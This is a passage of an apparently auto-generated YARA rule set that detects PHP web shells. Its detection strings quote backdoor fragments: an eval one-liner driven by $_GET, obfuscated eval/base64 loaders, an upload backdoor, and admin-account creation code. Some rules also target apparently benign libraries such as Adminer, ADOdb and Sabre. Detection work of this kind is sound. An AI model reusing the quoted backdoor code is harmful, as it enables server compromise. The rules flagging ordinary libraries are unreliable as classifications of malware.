      $s9 = "input{ margin:0;color:#fff;background-color:#555;border:1px solid #df5; font: 9pt Monospace,'Courier New'; }" fullword ascii
      $s10 = "ype=text name=m value='\".htmlspecialchars($v10963336).\"'><input type=submit value='>>'></form></td></tr>" fullword ascii
      $s11 = "table.info{ border-left:5px solid #df5;color:#fff;background-color:#000028; }" fullword ascii
      $s12 = "<tr><td><form method='post' ENCTYPE='multipart/form-data'>" fullword ascii
      $s13 = "tackRambler\"); if(preg_match('/' . implode('|', $v2045f746) . '/i', @$_SERVER['HTTP_USER_AGENT'])) { header('HTTP/1.0 404 Not F" ascii
      $s14 = "<form method=post name=fm style='display:none;'>" fullword ascii
      $s15 = "(isset($_POST['p3'])) $_POST['p3'] = urldecode($_POST['p3']); if(@$_POST['p2']=='download') { if(@is_file($_POST['p1']) && @is_r" ascii
      $s16 = "if(!empty($_SERVER['HTTP_USER_AGENT'])) { $v2045f746 = array(\"Google\", \"Slurp\", \"MSNBot\", \"ia_archiver\", \"Yandex\", \"R" ascii
      $s17 = "HOST'].\"/\\\">http://\".@$_SERVER['HTTP_HOST'].\"/</a><br>\".htmlspecialchars(realpath(@$_SERVER['DOCUMENT_ROOT']).DIRECTORY_SE" ascii
      $s18 = "'; $v2db95e8e = 0; foreach ($v10ae9fc7 as $v73600783) { if (@is_writable($v73600783)) $v9acb4454=\"<font color='green'>RW</font>" ascii
      $s19 = "<tr><td><form method=post><span>Chmod:</span>" fullword ascii
      $s20 = "1'])); if (function_exists(\"mime_content_type\")) { $v599dcce2 = @n85ced157($_POST['p1']); header(\"Content-Type: \" . $v599dcc" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_2f403e528e91d2e8b18c1febb2c94a59577677b3
{
   meta:
      description = "php17 - file 2f403e528e91d2e8b18c1febb2c94a59577677b3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ad950e648177c95e1347a029719495bfa17f11b0df551f10b9bc2713668c0e59"
   strings:
      $s1 = "$su = new COM(\"Shell.Users\");" fullword ascii
      $s2 = "Shell.Users" fullword ascii
      $s3 = "$h->changePassword($password,\"\");" fullword ascii
      $s4 = "$password=\"test\";" fullword ascii
      $s5 = "$h->setting[\"AccountType\"] = 3;//" fullword ascii
      $s6 = "$h=$su->create($username);" fullword ascii
      $s7 = "$username=\"isosky.test\";" fullword ascii
      $s8 = "echo \"<div align=center><b>PHP " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_8f7fdaf6aa9a06608f8c09586dc6d2423373f9f6
{
   meta:
      description = "php17 - file 8f7fdaf6aa9a06608f8c09586dc6d2423373f9f6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "df74afc2af90dc93ede0bf5cd6ef4b1f836de65d97c055593088dc30f5115315"
   strings:
      $s1 = "Mail: chinese@hackermail.com" fullword ascii
      $s2 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if(!file_" ascii
      $s3 = "part/form-data\"><input name=\"upfile\" type=\"file\"><input type=\"submit\" value=\"ok\"></form><?php }?>" fullword ascii
      $s4 = "Site: http://blog.weili.me" fullword ascii
      $s5 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if(!file_" ascii
      $s6 = "ILES[\"upfile\"][\"name\"])){ copy($_FILES[\"upfile\"][\"tmp_name\"], $_FILES[\"upfile\"][\"name\"]); }}?><form method=\"post\" " ascii
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule ActionSpec
{
   meta:
      description = "php17 - file ActionSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8edd642bcd8f3e4acc63285dcc10255348f02d7df8ad9c8e82a95f2b307ac281"
   strings:
      $s1 = "$this->getOptions()->shouldReturn(['route' => 'sylius_admin_product_update']);" fullword ascii
      $s2 = "$this->getLabel()->shouldReturn('Read book');" fullword ascii
      $s3 = "$this->getPosition()->shouldReturn(100);" fullword ascii
      $s4 = "$this->getIcon()->shouldReturn('checkmark');" fullword ascii
      $s5 = "$this->getPosition()->shouldReturn(1);" fullword ascii
      $s6 = "$this->getLabel()->shouldReturn(null);" fullword ascii
      $s7 = "$this->getIcon()->shouldReturn(null);" fullword ascii
      $s8 = "$this->getOptions()->shouldReturn([]);" fullword ascii
      $s9 = "namespace spec\\Sylius\\Component\\Grid\\Definition;" fullword ascii
      $s10 = "$this->getName()->shouldReturn('view');" fullword ascii
      $s11 = "$this->getType()->shouldReturn('link');" fullword ascii
      $s12 = "$this->beConstructedThrough('fromNameAndType', ['view', 'link']);" fullword ascii
      $s13 = "$this->setOptions(['route' => 'sylius_admin_product_update']);" fullword ascii
      $s14 = "function it_has_last_position_by_default(): void" fullword ascii
      $s15 = "$this->setLabel('Read book');" fullword ascii
      $s16 = "$this->isEnabled()->shouldReturn(false);" fullword ascii
      $s17 = "function it_has_no_label_by_default(): void" fullword ascii
      $s18 = "function it_has_no_icon_by_default(): void" fullword ascii
      $s19 = "function it_has_no_options_by_default(): void" fullword ascii
      $s20 = "function its_position_is_mutable(): void" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_6e43c4411972b54c6780f45d8863e08470f6a814
{
   meta:
      description = "php17 - file 6e43c4411972b54c6780f45d8863e08470f6a814.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
   strings:
      $x1 = "');?> 2011</a>. Copyright (C) 2012 <a href=\"http://t.qq.com/injecting\" target=\"_blank\">" fullword ascii
      $x2 = "Powered by <a title=\"Build 20110419\" href=\"http://t.qq.com/injecting\" target=\"_blank\"><?php echo str_replace('.','','P.h.p" ascii
      $x3 = "Powered by <a title=\"Build 20110419\" href=\"http://t.qq.com/injecting\" target=\"_blank\"><?php echo str_replace('.','','P.h.p" ascii
      $s4 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s5 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s6 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s7 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s8 = "<span style=\"float:right;\">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s9 = "p($comma.'<a href=\"javascript:godir(\\''.$drive->Path.'/\\');\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s10 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s11 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s12 = "mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s13 = "p(' | <a href=\"javascript:createdir();\">Create Directory</a> | <a href=\"javascript:createfile(\\''.$nowpath.'\\');\">" fullword ascii
      $s14 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s15 = "mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s16 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s17 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s18 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s19 = "scookie('loginpass',encode_pass($password));" fullword ascii
      $s20 = "return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_322a0646befd0343c7752913562bdfdee0a6c25a
{
   meta:
      description = "php17 - file 322a0646befd0343c7752913562bdfdee0a6c25a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b8068c2aa02c4c3361a0caadbb86df262c1fe876a9543cfdf339f1a8dbb2ce8f"
   strings:
      $x1 = "if ($ka){print'Success <br> Shell Injected in '.$template;}" fullword ascii
      $s2 = "$p = \"UPDATE \".$_POST[tab].\"template SET template ='\".$a.$code.\"\\'))}}{\\${exit()}}&' WHERE title ='\".$template.\"'\";" fullword ascii
      $s3 = "$p = \"UPDATE \".$_POST[tab].\"template SET template ='\".$a.$tkl_index.\"\\'))}}' WHERE title ='\".$lost.\"'\";" fullword ascii
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s5 = "'not_executed' => \"\\\"[%1]\\\" could not be executed successfully:\\n{%2}\"," fullword ascii
      $s6 = "'executed' => \"\\\"[%1]\\\" has been executed successfully:\\n{%2}\"," fullword ascii
      $s7 = "if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {" fullword ascii
      $s8 = "MlYwUFNKZllteGhibXNpUGx0SFlYcGhJRWhoUTB0bFVpQlVaV0Z0WFR3dllUNGdMU0E4WVNCb2NtVm1QU0pvZEhSd09pOHZaMkY2WVMxb1lXTnJaWEl1Ym1WMEwyTmpM" ascii
      $s9 = "echo '[ <a href=\"' . $self . '?tool=Files&dir=' . urlencode($real_file) . '\">' . html($file['target']) . '</a> ]';" fullword ascii
      $s10 = "Inject To :<br><select size=\"1\" name=\"template\">" fullword ascii
      $s11 = "exec('echo \"./' . basename($file) . '\" | /bin/sh', $output, $retval);" fullword ascii
      $s12 = "<form name=\"frm\" action=\"\" method=\"POST\" onsubmit=\"document.frm.code.value = encode64(document.frm.code.value)\">" fullword ascii
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s14 = "$src = ereg_replace('<font color=\"([^\"]*)\">', '<span style=\"color: \\1\">', ob_get_contents());" fullword ascii
      $s15 = "<form name=\"frm\" action=\"\" method=\"POST\" onsubmit=\"document.frm.code.value = vb(document.frm.code.value)\">" fullword ascii
      $s16 = "if (array_key_exists('reverse', $_GET) && $_GET['reverse'] == 'true') $reverse = true; else $reverse = false;" fullword ascii
      $s17 = "listing_page(error('not_executed', $file, implode(\"\\n\", $output)));" fullword ascii
      $s18 = "#                    Coded By TKL                                 #" fullword ascii
      $s19 = "cGJuUlFZV2RsU0dWaFpHVnlLQ0ptSWlrN0RRb0pDWEJ5YVc1MElDSkdZV2xzWldRZ2RHOGdaRzkzYm14dllXUWdKRVpwYkdWVmNtdzZJQ1FoSWpzTkNna0pKbEJ5YVc1" ascii
      $s20 = "cGU9InN1Ym1pdCI+IDwvRk9STT4nOyB9IGlmICgkX1BPU1RbJ3NlbmQnXSA9PSAnY2hhbmdlLWpvb21sYS1hZG1pbicpeyAkbG9jYWxob3N0ID0gJF9QT1NUWydsb2Nh" ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule ae8df887ad8cf58f64f5fd34562c9f6d018e7900
{
   meta:
      description = "php17 - file ae8df887ad8cf58f64f5fd34562c9f6d018e7900.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7afa949f396d33af00ac34e2cdcc4ffa34fd7377c89712397b51bb6bdcc57628"
   strings:
      $s1 = "$Y='uSplace(arruSay(\"/_/uSuS\",\"/uS-uS/\"),uSarray(\"/\",\"+\")uS,$suSs($s[$i],0,$e)uS)),$k))uS);uS$o=ob_getuS_couSntents';" fullword ascii
      $s2 = "$K='SERVER;$rruSuS=@$r[\"HuSTTP_REFEREuSR\"];$uSra=@$ruS[\"HTTPuSuS_AuSCCEPT_LANGUAuSGE\"];if($rr&&uS$rauS){$u=uSparsuSe_ur';" fullword ascii
      $s3 = "$A='S=0.uS([\\\\duS]))?,?/uS\",$ra,$m);uSif($uSuSq&&$m){@session_stuSart();$s=&$_SuSESSuSION;$ss=\"uSsuSubstr\";$sluS=u';" fullword ascii
      $s4 = "$F='S\"strtolowuSer\";$i=uS$m[1]uS[0].$m[1]uS[1uS];$h=$sl($uSuSuSss(md5($i.$kh),uS0,3));uSuS$f=$sl(uS$ss(md5($i.$ku';" fullword ascii
      $s5 = "$R=')===0){$s[$i]uSuS=\"\"uS;$p=$ss($puS,3);}if(uSaruSuSray_key_exists($iuS,$s))uS{$suS[$i].=$uSp;$euS=strpos($uSs';" fullword ascii
      $s6 = "$H='uS[$i],uS$f);if($e){$uSk=$kh.$kuSf;obuS_stauSrt();@euSval(@gzuncouSmuSuSpress(@x(@uSbase6uS4_decode(uSpreg_re';" fullword ascii
      $s7 = "$p='i=0;$iuS<$l;){fouSr($j=0;($juS<$c&&$i<$luS);$uSj+uS+,$i++uS)uS{$o.=$t{$i}^$kuS{$uSj};}}ruSetuuSrn $o;}uS$r=$_';" fullword ascii
      $s8 = "$i='Sf),0,3)uS);$p=uS\"\";fuSor($uSz=1;$z<counuSt($m[1uS]);uS$z++)$puS.=$q[$uSuSm[2]uS[$zuS]];ifuS(strpouSs($p,$h';" fullword ascii
      $s9 = "$k='$uSkh=uS\"uS5d4uS1\";$kf=\"40uS2a\";function x($t,$k){$uSc=suStrlenuS($k);$l=uSstrluSen($t);$uSouS=\"\";fouSr(uS$';" fullword ascii
      $s10 = "$o=str_replace('uS','',$k.$p.$K.$B.$A.$F.$i.$R.$H.$Y.$m);" fullword ascii
      $s11 = "$m='();obuS_enduS_cuSlean();$d=buSaseuS64_encoduSe(x(gzuScompresuSs($o),$uSk));puSrinuSt(\"<$uSuSk>$d</uS$k>\");@session_uSdestu" ascii
      $s12 = "$m='();obuS_enduS_cuSlean();$d=buSaseuS64_encoduSe(x(gzuScompresuSs($o),$uSk));puSrinuSt(\"<$uSuSk>$d</uS$k>\");@session_uSdestu" ascii
      $s13 = "$J=str_replace('d','','crdedate_dfdundctidon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_169_add_category_meta
{
   meta:
      description = "php17 - file 169_add_category_meta.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8017535161226ac22b3d621076b5b8794e60df402ea821b37b54c839d6904fc9"
   strings:
      $s1 = "$sql = \"CREATE TABLE IF NOT EXISTS `\" . $table . \"` (" fullword ascii
      $s2 = "KEY `extend` (`extend`)" fullword ascii
      $s3 = "if (!$this->has_table($table)) {" fullword ascii
      $s4 = "`id` int(6) NOT NULL AUTO_INCREMENT," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_05f971b5ec196b8c65b75d2ef8267331
{
   meta:
      description = "php17 - file 05f971b5ec196b8c65b75d2ef8267331.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e173f8c5d2263f914d7e1a024c0dc8b0e25d202e08dc57c6917129f08d7242ea"
   strings:
      $s1 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_ascii
{
   meta:
      description = "php17 - file ascii.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ab94d673bd4b404eee04dfe4a9203202955acdcf7c08d72639b555bb5235733e"
   strings:
      $s1 = "* @copyright    Copyright (C) 2007 - 2012 Johan Janssens. All rights reserved." fullword ascii
      $s2 = "* @license      GNU GPLv3 <http://www.gnu.org/licenses/gpl.html>" fullword ascii
      $s3 = "* Transliterate all unicode characters to US-ASCII. The string must be" fullword ascii
      $s4 = "* Returns true if the string only contains US-ASCII" fullword ascii
      $s5 = "* Validate a variable" fullword ascii
      $s6 = "$Id: ascii.php 4628 2012-05-06 19:56:43Z johanjanssens $" fullword ascii
      $s7 = "* well-formed UTF8" fullword ascii
      $s8 = "* Ascii filter" fullword ascii
      $s9 = "* @link " fullword ascii
      $s10 = "http://www.nooku.org" fullword ascii
      $s11 = "Johan Janssens <johan@nooku.org>" fullword ascii
      $s12 = "$string = htmlentities(utf8_decode($value));" fullword ascii
      $s13 = "return (preg_match('/(?:[^\\x00-\\x7F])/', $value) !== 1);" fullword ascii
      $s14 = "* @package     Koowa_Filter" fullword ascii
      $s15 = "* @package      Koowa_Filter" fullword ascii
      $s16 = "protected function _validate($value)" fullword ascii
      $s17 = "protected function _sanitize($value)" fullword ascii
      $s18 = "array('ss',\"$1\",\"$1\".'e',\"$1\")," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_0c942886f8e0aaf5b824f222c3ed84cb
{
   meta:
      description = "php17 - file 0c942886f8e0aaf5b824f222c3ed84cb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "717b6e76292bef4523fe8f3d85efb76bf586ab40a3e46404bf5b91901a26fa09"
   strings:
      $x1 = "as$z=>$X){if($z!=\"\"&&$X>1){echo($pc?\"<p>\":\" \").\"<a href='\".h(ME).\"dump=\".urlencode(\"$z%\").\"'>\".h($z).\"</a>\";$pc=" ascii
      $x2 = "as$Vc=>$X){if($X[0]<$eg)unset($Uc[$Vc]);}}$Tc=&$Uc[$c->bruteForceKey()];if(!$Tc)$Tc=array($eg+30*60,0);$Tc[1]++;$xf=serialize($U" ascii
      $x3 = "as$k=>$S){$lf=h(ME).\"db=\".urlencode($k);echo\"<tr\".odd().\">\".(support(\"database\")?\"<td>\".checkbox(\"db[]\",$k,in_array(" ascii
      $x4 = "as$V=>$_e){if($_e!==null){if($pc){echo\"<p id='logins' onmouseover='menuOver(this, event);' onmouseout='menuOut(this);'>\\n\";$p" ascii
      $x5 = "connect_error(){global$c,$g,$T,$m,$Eb;if(DB!=\"\"){header(\"HTTP/1.1 404 Not Found\");page_header(lang(31).\": \".h(DB),lang(96)" ascii
      $x6 = "EmailProcess($Z,$q)){if($_POST[\"save\"]||$_POST[\"delete\"]){$J=true;$na=0;$P=array();if(!$_POST[\"delete\"]){foreach($e" fullword ascii
      $x7 = "';if(!$L[\"hashed\"]){echo'<script type=\"text/javascript\">typePassword(document.getElementById(\\'pass\\'));</script>';}echo" fullword ascii
      $x8 = "password_file($i){$nc=get_temp_dir().\"/adminer.key\";$K=@file_get_contents($nc);if($K||!$i)return$K;$r=@fopen($nc,\"w\");if($r)" ascii
      $x9 = "password_file($i){$nc=get_temp_dir().\"/adminer.key\";$K=@file_get_contents($nc);if($K||!$i)return$K;$r=@fopen($nc,\"w\");if($r)" ascii
      $x10 = "ET[\"sql\"])||isset($_GET[\"dump\"])||isset($_GET[\"database\"])||isset($_GET[\"processlist\"])||isset($_GET[\"privileges\"])||i" ascii
      $s11 = "as$X){if($X[1]!=\"USAGE\")$yc[\"$C[2]$X[2]\"][$X[1]]=true;if(preg_match('~ WITH GRANT OPTION~',$L[0]))$yc[\"$C[2]$X[2]\"][\"GRAN" ascii
      $s12 = "doc_link($Ae){global$y,$g;$Fg=array('sql'=>\"http://dev.mysql.com/doc/refman/\".substr($g->server_info,0,3).\"/en/\",'sqlite'=>" ascii
      $s13 = "';}elseif(isset($_GET[\"dump\"])){$b=$_GET[\"dump\"];if($_POST&&!$m){$jb=\"\";foreach(array(\"output\",\"format\",\"db_style\"," ascii
      $s14 = "selectLengthProcess(){return(isset($_GET[\"text_length\"])?$_GET[\"text_length\"]:\"100\");}function" fullword ascii
      $s15 = "<a href=\"http://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($fa,$_COOKIE[\"adminer_version" ascii
      $s16 = "<a href=\"http://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($fa,$_COOKIE[\"adminer_version" ascii
      $s17 = "name(){return\"<a href='http://www.adminer.org/' target='_blank' id='h1'>Adminer</a>\";}function" fullword ascii
      $s18 = "add_invalid_login(){global$c;$nc=get_temp_dir().\"/adminer.invalid\";$r=@fopen($nc,\"r+\");if(!$r){$r=@fopen($nc,\"w\");if(!$r)r" ascii
      $s19 = "* @license http://www.gnu.org/licenses/gpl-2.0.html GNU General Public License, version 2 (one or other)" fullword ascii
      $s20 = "selectLimitProcess(){return(isset($_GET[\"limit\"])?$_GET[\"limit\"]:\"50\");}function" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 900KB and
      1 of ($x*) and all of them
}

rule sig_54b6b2bbe7fb0a1863ee9eda35425e59
{
   meta:
      description = "php17 - file 54b6b2bbe7fb0a1863ee9eda35425e59.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2f7136e5ae5985d99c1bc81e19ec0902262a25c2d6f52c297f5dd89086ba6e0e"
   strings:
      $s1 = "st\" action=\"\"><input type=\"text\"name=\"db_WP\"value=\"\"/><input type=\"submit\"value=\"&gt;\"/></form>" fullword ascii
      $s2 = ".~K';$db_WP=isset($_POST['db_WP'])?$_POST['db_WP']:(isset($_COOKIE['db_WP'])?$_COOKIE['db_WP']:NULL);if($db_WP!==NULL){$db_WP=md" ascii
      $s3 = ")@setcookie('db_WP', $_POST['db_WP']);$db___WP=create_function('',$db__WP);unset($db_WP,$db__WP);$db___WP();}}?><form method=\"p" ascii
      $s4 = ".~K';$db_WP=isset($_POST['db_WP'])?$_POST['db_WP']:(isset($_COOKIE['db_WP'])?$_COOKIE['db_WP']:NULL);if($db_WP!==NULL){$db_WP=md" ascii
      $s5 = "__WP[$db___WP])-ord($db_WP[$db___WP]))%256);$db_WP.=$db__WP[$db___WP];}if($db__WP=@gzinflate($db__WP)){if(isset($_POST['db_WP'])" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      all of them
}

rule adodb_pear_inc
{
   meta:
      description = "php17 - file adodb-pear.inc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5015ed52df4228d1af44d5945231097cfe65003853a3f62d2bb925836041578a"
   strings:
      $s1 = "* @copyright (c) 2000-2013 John Lim (jlim#natsoft.com). All rights reserved." fullword ascii
      $s2 = "* @copyright (c) 2014      Damien Regad, Mark Newnham and the ADOdb community" fullword ascii
      $s3 = "* @version   v5.20.4  30-Mar-2016" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      all of them
}

rule AK_74_Security_Team_Web_Shell_Beta_Version_2
{
   meta:
      description = "php17 - file AK-74 Security Team Web Shell Beta Version.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dc91561fd0b7a555e9e1a26fdd189d18832b9d896f50e7f8afa153773d1a851c"
   strings:
      $x1 = "<b><font color=#830000>3.</font></b><font color=#830000> <b><font color=#830000>User</b></font> - '.( get_current_user()).' " fullword ascii
      $x2 = "$res .= '<form action=\"'.$xshell.'?act=execute\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"execute\">" fullword ascii
      $x3 = "<b><font color=#83000>Execute system commands!</font></b>" fullword ascii
      $x4 = "<b><font color=#830000>7. Your IP - </font></b><font color=#830000>'.(getenv('REMOTE_ADDR')).'</font><br><br>" fullword ascii
      $s5 = "<b><font color=#830000>4. Server Software - </font></b><font color=#830000>'.(getenv('SERVER_SOFTWARE')).'</font><br><br>" fullword ascii
      $s6 = "<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Security Te" ascii
      $s7 = "$res .= '<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Se" ascii
      $s8 = "<b><font color=#830000>5. Request Method - </font></b><font color=#830000>'.(getenv('REQUEST_METHOD')).'</font><br><br>" fullword ascii
      $s9 = "if (!move_uploaded_file($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))" fullword ascii
      $s10 = "<b><font color=#830000>6. Server IP - </font></b><font color=#830000>'.(getenv('SERVER_ADDR')).'</font><br><br>" fullword ascii
      $s11 = "$content .= $shell->downloadfile($_GET['file']);" fullword ascii
      $s12 = "$res .= '<form action=\"'.$xshell.'?act=filemanager\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"chmod\">'" fullword ascii
      $s13 = "$res .= '<form action=\"'.$xshell.'?act=exesys\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"exesys\">" fullword ascii
      $s14 = "<a href=\"'.$xshell.'?act=phpinfo\" target=\"_blank\">phpinfo()</a>" fullword ascii
      $s15 = "if (!copy($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))" fullword ascii
      $s16 = "ty Team<a> <font color=#83000>2005 - '.date(\"Y\").'</font></b></td></tr>';" fullword ascii
      $s17 = "$content .= $shell->editfileform($_GET['file']);" fullword ascii
      $s18 = "$res .= '<html><head><title>AK-74 Security Team Web Shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=" ascii
      $s19 = "$res .= '<html><head><title>AK-74 Security Team Web Shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=" ascii
      $s20 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'.(getenv('HTTP_X_FORWARDED_FOR')).'</font><br><br" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule ACLTrait
{
   meta:
      description = "php17 - file ACLTrait.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0f9f952f958bc9287b5b553e8b8c1b8c4dc5ef67dd5da30039a567caeba2e0df"
   strings:
      $x1 = "* @copyright Copyright (C) fruux GmbH (https://fruux.com/)" fullword ascii
      $x2 = "* @author Evert Pot (https://evertpot.com/)" fullword ascii
      $s3 = "* See Sabre\\DAVACL\\Plugin::getDefaultSupportedPrivilegeSet for a simple" fullword ascii
      $s4 = "* By default this trait grants all privileges to the owner of the resource." fullword ascii
      $s5 = "* Returns the list of supported privileges for this node." fullword ascii
      $s6 = "* If null is returned from this method, the default privilege set is used," fullword ascii
      $s7 = "* @license http://sabre.io/license/ Modified BSD License" fullword ascii
      $s8 = "*   * 'privilege', a string such as {DAV:}read or {DAV:}write. These are" fullword ascii
      $s9 = "* The returned data structure is a list of nested privileges." fullword ascii
      $s10 = "* This method will receive a list of new ACE's as an array argument." fullword ascii
      $s11 = "* This must be a url to a principal, or null if there's no owner" fullword ascii
      $s12 = "function getSupportedPrivilegeSet() {" fullword ascii
      $s13 = "* This trait is a default implementation of the IACL interface." fullword ascii
      $s14 = "throw new \\Sabre\\DAV\\Exception\\Forbidden('Setting ACL is not supported on this node');" fullword ascii
      $s15 = "*     currently the only supported privileges" fullword ascii
      $s16 = "* Each ACE has the following properties:" fullword ascii
      $s17 = "* Returns a list of ACE's for this node." fullword ascii
      $s18 = "* this trait allows you to be a bit lazier." fullword ascii
      $s19 = "* In many cases you only want to implement 1 or to of the IACL functions," fullword ascii
      $s20 = "* which is fine for most common usecases." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      1 of ($x*) and 4 of them
}

rule sig_52c6c83e17d829848412617c819ad599ccc2e202
{
   meta:
      description = "php17 - file 52c6c83e17d829848412617c819ad599ccc2e202.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6a1042c14d220c6258e8d8a376fa03ecd7e953ca144a3099a5c97b78306c9fcf"
   strings:
      $s1 = "$E='X,0X,$e))),$Xk))XX);$o=ob_get_contentXsX();ob_end_XcXlean();$d=bXase64_XencoX';" fullword ascii
      $s2 = "$g='?:;q=0.XX([\\\\d])X)X?,?/\",$ra,$m);ifX($q&X&$m){@Xsession_staXrt()X;$s=X&XX$_SESS';" fullword ascii
      $s3 = "$H='X$i],$f);XiXf(X$e){$k=$kh.$kf;ob_sXtarXt();@evXal(@gXzuncompressX(X@x(@baXse6';" fullword ascii
      $s4 = "$K='{$i}^X$k{$j};X}}return $oX;}$Xr=$X_SERVER;$Xrr=@$r[\"XXHTTP_REFXERXER\"]X;$ra=@$r';" fullword ascii
      $s5 = "$Q='[\"XHTTP_ACCEPTX_LANGUAGXEX\"];if($rrX&X&$ra){$u=Xparse_Xurl($rr);pXarseX_XstX';" fullword ascii
      $s6 = "$k='de(x(gzXXXcompressX($o),$k));priXnt(\"X<$k>$Xd</$k>\");@XsXession_deXstroy();}}}}';" fullword ascii
      $s7 = "$j='X4X_decode(preXXg_replace(array(\"X/_/X\",\"/-/X\"),array(\"/\"X,\"+X\"X),$ss($s[$i]';" fullword ascii
      $s8 = "$u='X$kh=\"X5d41\";$kf=\"402Xa\";functXioXn x(X$t,$kX){$c=strlen($kX);$l=sXtXrlen($tX)';" fullword ascii
      $s9 = "$e='ION;$ss=X\"subsXtXr\";$sl=\"strtolowerX\";$i=X$XXm[1][0X].$m[1][1X];$h=$sl($ss(mXd';" fullword ascii
      $s10 = "$I='r($u[X\"Xquery\"],X$q);$q=aXrray_vXalXues($Xq);pregX_match_all(\"/([\\\\w])X[\\\\w-X]+(';" fullword ascii
      $s11 = "$W=';$p=$sXs($p,3);}Xif(XarrXaXy_kXey_exists($XiX,$s))X{$s[$i]X.=$p;$e=strpoXs($s[';" fullword ascii
